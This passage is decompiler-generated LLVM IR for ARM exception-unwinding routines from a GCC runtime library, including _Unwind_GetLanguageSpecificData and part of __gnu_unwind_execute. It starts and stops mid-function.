  %v25_19ea8 = inttoptr i32 %v24_19ea8 to i32*
  %v26_19ea8 = load i32, i32* %v25_19ea8, align 4
  store i32 %v26_19ea8, i32* @r8, align 4
  %v27_19ea8 = add i32 %tmp, 36
  %v28_19ea8 = inttoptr i32 %v27_19ea8 to i32*
  %v29_19ea8 = load i32, i32* %v28_19ea8, align 4
  store i32 %v29_19ea8, i32* @sb, align 4
  %v30_19ea8 = add i32 %tmp, 40
  %v31_19ea8 = inttoptr i32 %v30_19ea8 to i32*
  %v32_19ea8 = load i32, i32* %v31_19ea8, align 4
  store i32 %v32_19ea8, i32* @sl, align 4
  store i32 %v8_19e9c, i32* @ip, align 4
  store i32 %v5_19e9c, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_19e9c)
  ret i32 %v2_19ea8

; uselistorder directives
  uselistorder i32 %v8_19e9c, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 63, 64, 65, 66, 15, 16, 6, 7, 1, 69, 8, 67, 68, 13, 14, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 2, 103, 104, 105, 106, 107, 108, 109, 110, 111, 9, 112, 113, 114, 25, 26, 27, 28, 29, 3, 30, 31, 32, 21, 22, 23, 24, 33, 34, 35, 36, 10, 37, 11, 20, 12, 38, 39, 40, 41, 0, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 4, 17, 18, 19, 54, 55, 56, 57, 58, 59, 60, 5, 61, 62 }
  uselistorder i32 40, { 30, 26, 27, 28, 29, 11, 31, 2, 12, 4, 5, 1, 6, 3, 13, 14, 7, 15, 16, 17, 18, 19, 20, 22, 21, 0, 8, 23, 9, 24, 10, 25 }
  uselistorder i32* @sb, { 121, 122, 123, 2, 3, 4, 5, 97, 98, 99, 100, 101, 102, 103, 104, 109, 112, 110, 111, 113, 86, 87, 71, 72, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 29, 30, 25, 26, 27, 28, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 1, 62, 63, 64, 65, 66, 67, 68, 69, 70, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 88, 89, 90, 91, 92, 93, 94, 95, 96, 105, 106, 107, 108, 114, 115, 116, 117, 118, 119, 120 }
  uselistorder i32 36, { 17, 16, 4, 18, 6, 7, 5, 13, 15, 8, 14, 9, 0, 1, 2, 3, 10, 11, 12 }
  uselistorder i32* @r8, { 276, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 1, 275, 0, 37, 277, 9, 278, 38, 39, 40, 41, 24, 25, 26, 27, 28, 29, 30, 31, 32, 3, 33, 34, 35, 36, 42, 43, 44, 45, 10, 279, 21, 22, 4, 23, 280, 176, 177, 5, 178, 179, 180, 208, 209, 210, 211, 212, 7, 213, 214, 215, 216, 217, 218, 219, 220, 11, 162, 163, 164, 165, 12, 221, 222, 223, 224, 225, 143, 144, 145, 146, 226, 227, 228, 229, 13, 14, 88, 89, 90, 91, 92, 230, 231, 232, 233, 93, 94, 95, 96, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 16, 17, 18, 19, 20, 15, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 81, 78, 79, 80, 82, 83, 84, 85, 86, 87, 97, 98, 99, 100, 101, 102, 103, 104, 105, 109, 106, 107, 108, 110, 111, 112, 113, 114, 116, 115, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 166, 167, 2, 171, 168, 169, 170, 172, 173, 174, 175, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 205, 202, 203, 204, 8, 206, 207, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 6, 254, 255, 256, 257 }
  uselistorder i32 32, { 110, 107, 108, 109, 65, 111, 112, 61, 79, 113, 60, 103, 66, 62, 92, 90, 91, 87, 88, 89, 96, 97, 93, 94, 81, 67, 101, 102, 104, 1, 2, 4, 3, 105, 6, 5, 8, 7, 10, 9, 82, 63, 68, 64, 106, 69, 95, 12, 11, 14, 13, 70, 83, 71, 84, 72, 85, 73, 86, 16, 15, 18, 17, 80, 20, 19, 21, 23, 22, 25, 24, 26, 27, 29, 28, 74, 75, 98, 30, 99, 31, 100, 32, 33, 34, 35, 36, 37, 76, 38, 39, 40, 77, 41, 0, 42, 43, 44, 46, 45, 48, 47, 50, 49, 51, 53, 52, 55, 54, 57, 56, 58, 59, 78 }
  uselistorder i32 28, { 50, 11, 33, 51, 30, 52, 53, 54, 55, 7, 34, 35, 31, 32, 40, 12, 36, 13, 47, 48, 49, 8, 14, 15, 37, 0, 20, 1, 21, 2, 22, 3, 23, 4, 24, 5, 25, 16, 26, 17, 27, 18, 28, 6, 29, 9, 19, 39, 38, 41, 42, 43, 44, 45, 46, 10 }
  uselistorder i32 24, { 107, 106, 108, 11, 12, 109, 0, 65, 66, 67, 68, 69, 70, 63, 64, 13, 71, 72, 82, 83, 73, 74, 8, 14, 100, 101, 102, 105, 1, 84, 85, 86, 41, 42, 15, 75, 76, 49, 77, 60, 44, 45, 46, 47, 48, 50, 51, 52, 53, 54, 16, 55, 17, 56, 18, 57, 58, 59, 61, 62, 78, 79, 80, 81, 19, 20, 21, 22, 2, 23, 24, 9, 87, 88, 25, 26, 3, 27, 89, 28, 29, 30, 10, 90, 31, 32, 33, 91, 34, 4, 92, 93, 94, 95, 35, 36, 96, 37, 97, 38, 5, 98, 6, 39, 99, 103, 40, 104, 7, 43 }
  uselistorder i32 20, { 124, 122, 123, 125, 1, 4, 11, 34, 126, 30, 127, 128, 129, 130, 5, 131, 132, 2, 133, 35, 12, 31, 32, 33, 36, 37, 38, 48, 49, 39, 40, 134, 107, 108, 109, 110, 111, 112, 113, 13, 114, 115, 117, 3, 50, 14, 51, 52, 0, 24, 42, 43, 15, 44, 16, 45, 23, 41, 46, 47, 53, 55, 6, 54, 56, 57, 58, 59, 60, 61, 7, 62, 63, 64, 65, 66, 67, 69, 70, 17, 68, 71, 72, 73, 74, 75, 76, 78, 79, 18, 77, 80, 81, 82, 83, 85, 86, 19, 84, 87, 88, 89, 90, 91, 92, 94, 20, 93, 95, 96, 97, 100, 8, 98, 21, 99, 101, 102, 105, 9, 103, 22, 104, 106, 116, 25, 26, 27, 28, 29, 118, 119, 120, 10, 121 }
  uselistorder i32* @r1, { 189, 15, 16, 17, 4, 190, 191, 63, 64, 80, 43, 2, 193, 44, 192, 136, 45, 46, 47, 18, 65, 1, 66, 67, 19, 196, 20, 5, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 6, 214, 215, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 69, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 3, 79, 25, 138, 95, 96, 216, 21, 218, 219, 220, 221, 101, 102, 29, 82, 30, 217, 22, 31, 139, 140, 127, 128, 129, 130, 131, 132, 133, 42, 141, 7, 134, 135, 8, 142, 145, 143, 9, 144, 83, 84, 23, 146, 147, 148, 137, 120, 121, 12, 32, 33, 34, 35, 36, 37, 38, 10, 224, 225, 226, 227, 0, 228, 24, 81, 97, 149, 222, 223, 150, 26, 194, 195, 27, 13, 85, 98, 151, 152, 28, 153, 154, 86, 87, 39, 40, 41, 88, 89, 90, 91, 92, 122, 93, 94, 14, 99, 100, 123, 124, 11, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 125, 126, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188 }
  uselistorder i32 60, { 3, 25, 26, 27, 4, 5, 1, 6, 18, 19, 20, 21, 22, 23, 7, 14, 15, 8, 16, 17, 9, 10, 0, 11, 12, 13, 2, 24 }
  uselistorder i32 56, { 3, 37, 38, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 15, 14, 2, 16, 17, 18, 19, 20, 34, 35, 31, 32, 4, 5, 1, 6, 0, 7, 33, 36, 8, 11, 9, 12, 10, 13 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19eb8 = load i32, i32* @r0, align 4
  ret i32 %v1_19eb8
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19ec0 = load i32, i32* @r0, align 4
  ret i32 %v1_19ec0
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19ed4 = ptrtoint i32* %stack_var_-68 to i32
  %v2_19ed8 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_19ed4, i32 0)
  ret i32 %v2_19ed8

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19ef8 = ptrtoint i32* %stack_var_-68 to i32
  %v2_19efc = call i32 @__gnu_Unwind_Resume(i32 %v2_19ef8, i32 0)
  ret i32 %v2_19efc

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19f1c = ptrtoint i32* %stack_var_-68 to i32
  %v2_19f20 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_19f1c, i32 0)
  ret i32 %v2_19f20

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19f40 = ptrtoint i32* %stack_var_-68 to i32
  %v6_19f44 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_19f40, i32 %arg2, i8* %arg3, i32 %v2_19f40)
  ret i32 %v6_19f44

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_19f70 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_19f78 = add i32 %tmp1, 76
  %v2_19f78 = inttoptr i32 %v1_19f78 to i32*
  %v3_19f78 = load i32, i32* %v2_19f78, align 4
  %v1_19f7c = add i32 %v3_19f78, 7
  %v2_19f7c = inttoptr i32 %v1_19f7c to i8*
  %v3_19f7c = load i8, i8* %v2_19f7c, align 1
  %v4_19f7c = zext i8 %v3_19f7c to i32
  %v1_19f80 = add i32 %v3_19f78, 8
  %v3_19f84 = mul nuw nsw i32 %v4_19f7c, 4
  %v2_19f88 = add i32 %v3_19f84, %v1_19f80
  %v3_19f88 = inttoptr i32 %v2_19f88 to i8*
  ret i8* %v3_19f88
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_19f98 = load i32, i32* @r6, align 4
  %v21_19f98 = load i32, i32* @lr, align 4
  %v0_19f9c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_19f9c, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_19fac

dec_label_pc_19fac:                               ; preds = %dec_label_pc_19fac.backedge, %entry
  %v3_19fb8 = phi i32 [ %v0_19fac.pre, %dec_label_pc_19fac.backedge ], [ %tmp, %entry ]
  %v1_19fac = add i32 %v3_19fb8, 8
  %v2_19fac = inttoptr i32 %v1_19fac to i8*
  %v3_19fac = load i8, i8* %v2_19fac, align 1
  %v4_19fac = zext i8 %v3_19fac to i32
  store i32 %v4_19fac, i32* %r3.global-to-local, align 4
  %v2_19fb0 = icmp eq i8 %v3_19fac, 0
  store i1 %v2_19fb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19fb0, label %dec_label_pc_19fc0, label %.thread

.thread:                                          ; preds = %dec_label_pc_19fac
  %v2_19fb4 = add nsw i32 %v4_19fac, -1
  store i32 %v2_19fb4, i32* %r3.global-to-local, align 4
  %v2_19fb8 = trunc i32 %v2_19fb4 to i8
  store i8 %v2_19fb8, i8* %v2_19fac, align 1
  %v0_19fbc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19fbc.pr.pr, label %.thread.dec_label_pc_19fc0_crit_edge, label %dec_label_pc_19fe8

.thread.dec_label_pc_19fc0_crit_edge:             ; preds = %.thread
  %v0_19fc0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19fc0

dec_label_pc_19fc0:                               ; preds = %.thread.dec_label_pc_19fc0_crit_edge, %dec_label_pc_19fac
  %v0_19fc0 = phi i32 [ %v0_19fc0.pre, %.thread.dec_label_pc_19fc0_crit_edge ], [ %v3_19fb8, %dec_label_pc_19fac ]
  %v1_19fc0 = add i32 %v0_19fc0, 9
  %v2_19fc0 = inttoptr i32 %v1_19fc0 to i8*
  %v3_19fc0 = load i8, i8* %v2_19fc0, align 1
  %v4_19fc0 = zext i8 %v3_19fc0 to i32
  store i32 %v4_19fc0, i32* %r3.global-to-local, align 4
  %v2_19fc4 = icmp eq i8 %v3_19fc0, 0
  store i1 %v2_19fc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19fc4, label %dec_label_pc_1a0c8, label %dec_label_pc_19fcc

dec_label_pc_19fcc:                               ; preds = %dec_label_pc_1a0bc, %dec_label_pc_19fc0
  %v2_19fd0 = phi i32 [ %v0_1a0bc, %dec_label_pc_1a0bc ], [ %v0_19fc0, %dec_label_pc_19fc0 ]
  %v0_19fcc = phi i32 [ %v4_1a0bc, %dec_label_pc_1a0bc ], [ %v4_19fc0, %dec_label_pc_19fc0 ]
  %v1_19fcc = add nsw i32 %v0_19fcc, -1
  store i32 %v1_19fcc, i32* %r3.global-to-local, align 4
  %v1_19fd0 = trunc i32 %v1_19fcc to i8
  %v3_19fd0 = add i32 %v2_19fd0, 9
  %v4_19fd0 = inttoptr i32 %v3_19fd0 to i8*
  store i8 %v1_19fd0, i8* %v4_19fd0, align 1
  %v0_19fd4 = load i32, i32* @r5, align 4
  %v1_19fd4 = add i32 %v0_19fd4, 4
  %v2_19fd4 = inttoptr i32 %v1_19fd4 to i32*
  %v3_19fd4 = load i32, i32* %v2_19fd4, align 4
  store i32 %v3_19fd4, i32* %r2.global-to-local, align 4
  %v1_19fd8 = inttoptr i32 %v3_19fd4 to i32*
  %v2_19fd8 = load i32, i32* %v1_19fd8, align 4
  store i32 %v2_19fd8, i32* %r0.global-to-local, align 4
  %v4_19fd8 = add i32 %v3_19fd4, 4
  store i32 %v4_19fd8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_19fe0 = inttoptr i32 %v0_19fd4 to i32*
  store i32 %v2_19fd8, i32* %v1_19fe0, align 4
  %v5_19fe0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19fe0, i32* %v2_19fd4, align 4
  %v0_19fe4 = load i32, i32* %r3.global-to-local, align 4
  %v1_19fe4 = trunc i32 %v0_19fe4 to i8
  %v2_19fe4 = load i32, i32* @r5, align 4
  %v3_19fe4 = add i32 %v2_19fe4, 8
  %v4_19fe4 = inttoptr i32 %v3_19fe4 to i8*
  store i8 %v1_19fe4, i8* %v4_19fe4, align 1
  br label %dec_label_pc_19fe8

dec_label_pc_19fe8:                               ; preds = %.thread, %dec_label_pc_19fcc, %.thread6
  %v0_19fe8 = load i32, i32* @r5, align 4
  %v1_19fe8 = inttoptr i32 %v0_19fe8 to i32*
  %v2_19fe8 = load i32, i32* %v1_19fe8, align 4
  %v3_19fec = udiv i32 %v2_19fe8, 16777216
  store i32 %v3_19fec, i32* @r4, align 4
  store i32 %v3_19fec, i32* %ip.global-to-local, align 4
  %v3_19ff4 = mul i32 %v2_19fe8, 256
  store i32 %v3_19ff4, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_19fe8, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_19ff4, i32* %v1_19fe8, align 4
  br i1 %tmp183, label %dec_label_pc_1a0c8, label %dec_label_pc_1a004

dec_label_pc_1a004:                               ; preds = %dec_label_pc_19fe8
  %v0_1a004 = load i32, i32* @r4, align 4
  %v1_1a004 = and i32 %v0_1a004, 128
  store i32 %v1_1a004, i32* %r1.global-to-local, align 4
  %v2_1a004 = icmp eq i32 %v1_1a004, 0
  store i1 %v2_1a004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a004, label %dec_label_pc_1a0e0, label %dec_label_pc_1a00c

dec_label_pc_1a00c:                               ; preds = %dec_label_pc_1a004
  %v1_1a00c = and i32 %v0_1a004, 240
  store i32 %v1_1a00c, i32* @r6, align 4
  %v7_1a010 = icmp eq i32 %v1_1a00c, 128
  store i1 %v7_1a010, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a010, label %dec_label_pc_1a018, label %dec_label_pc_1a13c

dec_label_pc_1a018:                               ; preds = %dec_label_pc_1a00c
  %v0_1a018 = load i32, i32* @r5, align 4
  %v1_1a018 = add i32 %v0_1a018, 8
  %v2_1a018 = inttoptr i32 %v1_1a018 to i8*
  %v3_1a018 = load i8, i8* %v2_1a018, align 1
  %v4_1a018 = zext i8 %v3_1a018 to i32
  store i32 %v4_1a018, i32* %r3.global-to-local, align 4
  %v2_1a01c = icmp eq i8 %v3_1a018, 0
  store i1 %v2_1a01c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a01c, label %dec_label_pc_1a02c, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1a018
  %v2_1a020 = add nsw i32 %v4_1a018, -1
  store i32 %v2_1a020, i32* %r3.global-to-local, align 4
  %v2_1a024 = trunc i32 %v2_1a020 to i8
  store i8 %v2_1a024, i8* %v2_1a018, align 1
  %v0_1a028.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a028.pr.pr, label %.thread3.dec_label_pc_1a02c_crit_edge, label %dec_label_pc_1a05c

.thread3.dec_label_pc_1a02c_crit_edge:            ; preds = %.thread3
  %v0_1a02c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a02c

dec_label_pc_1a02c:                               ; preds = %.thread3.dec_label_pc_1a02c_crit_edge, %dec_label_pc_1a018
  %v2_1a040 = phi i32 [ %v0_1a02c.pre, %.thread3.dec_label_pc_1a02c_crit_edge ], [ %v0_1a018, %dec_label_pc_1a018 ]
  %v1_1a02c = add i32 %v2_1a040, 9
  %v2_1a02c = inttoptr i32 %v1_1a02c to i8*
  %v3_1a02c = load i8, i8* %v2_1a02c, align 1
  %v4_1a02c = zext i8 %v3_1a02c to i32
  store i32 %v4_1a02c, i32* %r3.global-to-local, align 4
  %v2_1a030 = icmp eq i8 %v3_1a02c, 0
  store i1 %v2_1a030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a030, label %dec_label_pc_1a06c, label %dec_label_pc_1a03c

dec_label_pc_1a03c:                               ; preds = %dec_label_pc_1a02c
  %v1_1a03c = add nsw i32 %v4_1a02c, -1
  store i32 %v1_1a03c, i32* %r3.global-to-local, align 4
  %v1_1a040 = trunc i32 %v1_1a03c to i8
  store i8 %v1_1a040, i8* %v2_1a02c, align 1
  %v0_1a044 = load i32, i32* @r5, align 4
  %v1_1a044 = add i32 %v0_1a044, 4
  %v2_1a044 = inttoptr i32 %v1_1a044 to i32*
  %v3_1a044 = load i32, i32* %v2_1a044, align 4
  store i32 %v3_1a044, i32* %r2.global-to-local, align 4
  %v1_1a048 = inttoptr i32 %v3_1a044 to i32*
  %v2_1a048 = load i32, i32* %v1_1a048, align 4
  store i32 %v2_1a048, i32* %r0.global-to-local, align 4
  %v4_1a048 = add i32 %v3_1a044, 4
  store i32 %v4_1a048, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a048, i32* %v2_1a044, align 4
  %v0_1a054 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a054 = trunc i32 %v0_1a054 to i8
  %v2_1a054 = load i32, i32* @r5, align 4
  %v3_1a054 = add i32 %v2_1a054, 8
  %v4_1a054 = inttoptr i32 %v3_1a054 to i8*
  store i8 %v1_1a054, i8* %v4_1a054, align 1
  %v0_1a058 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a058 = load i32, i32* @r5, align 4
  %v2_1a058 = inttoptr i32 %v1_1a058 to i32*
  store i32 %v0_1a058, i32* %v2_1a058, align 4
  br label %dec_label_pc_1a05c

dec_label_pc_1a05c:                               ; preds = %.thread3, %dec_label_pc_1a03c
  %v0_1a05c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a05c, i32* %r3.global-to-local, align 4
  %v3_1a060 = mul i32 %v0_1a05c, 256
  store i32 %v3_1a060, i32* %r0.global-to-local, align 4
  %v1_1a064 = load i32, i32* @r5, align 4
  %v2_1a064 = inttoptr i32 %v1_1a064 to i32*
  store i32 %v3_1a060, i32* %v2_1a064, align 4
  %v0_1a068 = load i32, i32* %r3.global-to-local, align 4
  %v3_1a068 = udiv i32 %v0_1a068, 16777216
  br label %dec_label_pc_1a06c

dec_label_pc_1a06c:                               ; preds = %dec_label_pc_1a02c, %dec_label_pc_1a05c
  %storemerge133 = phi i32 [ %v3_1a068, %dec_label_pc_1a05c ], [ 176, %dec_label_pc_1a02c ]
  %v1_1a06c = load i32, i32* %ip.global-to-local, align 4
  %v4_1a06c = mul i32 %v1_1a06c, 256
  %v5_1a06c = or i32 %v4_1a06c, %storemerge133
  store i32 %v5_1a06c, i32* %r2.global-to-local, align 4
  %v7_1a070 = icmp eq i32 %v5_1a06c, 32768
  store i1 %v7_1a070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a070, label %dec_label_pc_1a27c, label %dec_label_pc_1a078

dec_label_pc_1a078:                               ; preds = %dec_label_pc_1a06c
  %v3_1a078 = mul i32 %v5_1a06c, 16
  store i32 %v3_1a078, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_1a088 = and i32 %v3_1a078, 65520
  store i32 %v3_1a088, i32* %r2.global-to-local, align 4
  %v0_1a08c = load i32, i32* @r7, align 4
  store i32 %v0_1a08c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_1a094 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a08c, i32 %v3_1a088, i32 0, i32 0)
  store i32 %v4_1a094, i32* %r0.global-to-local, align 4
  %v2_1a098 = icmp eq i32 %v4_1a094, 0
  store i1 %v2_1a098, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a098, label %dec_label_pc_1a0a0, label %dec_label_pc_1a27c

dec_label_pc_1a0a0:                               ; preds = %dec_label_pc_1a078
  %v0_1a0a0 = load i32, i32* @r5, align 4
  %v1_1a0a0 = add i32 %v0_1a0a0, 8
  %v2_1a0a0 = inttoptr i32 %v1_1a0a0 to i8*
  %v3_1a0a0 = load i8, i8* %v2_1a0a0, align 1
  %v4_1a0a0 = zext i8 %v3_1a0a0 to i32
  store i32 %v4_1a0a0, i32* %r3.global-to-local, align 4
  %v0_1a0a4 = load i32, i32* @r4, align 4
  %v1_1a0a4 = and i32 %v0_1a0a4, 32768
  %v2_1a0a4 = icmp eq i32 %v1_1a0a4, 0
  store i1 %v2_1a0a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0a4, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_1a0a0
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_1a0a0, %bb147
  %v2_1a0ac = icmp eq i8 %v3_1a0a0, 0
  store i1 %v2_1a0ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0ac, label %dec_label_pc_1a0bc, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_1a0b0 = add nsw i32 %v4_1a0a0, -1
  store i32 %v2_1a0b0, i32* %r3.global-to-local, align 4
  %v2_1a0b4 = trunc i32 %v2_1a0b0 to i8
  store i8 %v2_1a0b4, i8* %v2_1a0a0, align 1
  %v0_1a0b8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a0b8.pr.pr, label %.thread6.dec_label_pc_1a0bc_crit_edge, label %dec_label_pc_19fe8

.thread6.dec_label_pc_1a0bc_crit_edge:            ; preds = %.thread6
  %v0_1a0bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a0bc

dec_label_pc_1a0bc:                               ; preds = %bb148, %.thread6.dec_label_pc_1a0bc_crit_edge
  %v0_1a0bc = phi i32 [ %v0_1a0bc.pre, %.thread6.dec_label_pc_1a0bc_crit_edge ], [ %v0_1a0a0, %bb148 ]
  %v1_1a0bc = add i32 %v0_1a0bc, 9
  %v2_1a0bc = inttoptr i32 %v1_1a0bc to i8*
  %v3_1a0bc = load i8, i8* %v2_1a0bc, align 1
  %v4_1a0bc = zext i8 %v3_1a0bc to i32
  store i32 %v4_1a0bc, i32* %r3.global-to-local, align 4
  %v2_1a0c0 = icmp eq i8 %v3_1a0bc, 0
  store i1 %v2_1a0c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0c0, label %dec_label_pc_1a0c8, label %dec_label_pc_19fcc

dec_label_pc_1a0c8:                               ; preds = %dec_label_pc_1a0bc, %dec_label_pc_19fc0, %dec_label_pc_19fe8
  %v0_1a0c8 = load i32, i32* @sl, align 4
  %v2_1a0c8 = icmp eq i32 %v0_1a0c8, 0
  store i1 %v2_1a0c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0c8, label %dec_label_pc_1a190, label %bb149

bb149:                                            ; preds = %dec_label_pc_1a0c8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a0d4

dec_label_pc_1a0d4:                               ; preds = %bb149, %dec_label_pc_1a644, %dec_label_pc_1a4e4, %dec_label_pc_1a308, %dec_label_pc_1a2c0, %dec_label_pc_1a27c, %dec_label_pc_1a190
  %v1_1a0dc = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_1a644 ], [ 9, %dec_label_pc_1a4e4 ], [ 9, %dec_label_pc_1a308 ], [ 9, %dec_label_pc_1a2c0 ], [ 9, %dec_label_pc_1a27c ], [ %v0_1a1c4, %dec_label_pc_1a190 ]
  store i32 %v9_19f98, i32* %r6.global-to-local, align 4
  store i32 %v21_19f98, i32* @lr, align 4
  ret i32 %v1_1a0dc

dec_label_pc_1a0e0:                               ; preds = %dec_label_pc_1a004
  %v1_1a0e0 = mul i32 %v0_1a004, 4
  %v3_1a0e4 = and i32 %v1_1a0e0, 252
  store i32 %v3_1a0e4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a0f0 = load i32, i32* @r7, align 4
  store i32 %v0_1a0f0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_1a0f8 = add nuw nsw i32 %v3_1a0e4, 4
  store i32 %v1_1a0f8, i32* %r6.global-to-local, align 4
  %v5_1a100 = call i32 @_Unwind_VRS_Get(i32 %v0_1a0f0, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_1a104 = load i32, i32* @r4, align 4
  %v1_1a104 = and i32 %v0_1a104, 64
  %v2_1a104 = icmp eq i32 %v1_1a104, 0
  store i1 %v2_1a104, i1* %cpsr_z.global-to-local, align 1
  %v4_1a10c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_1a118 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_1a118
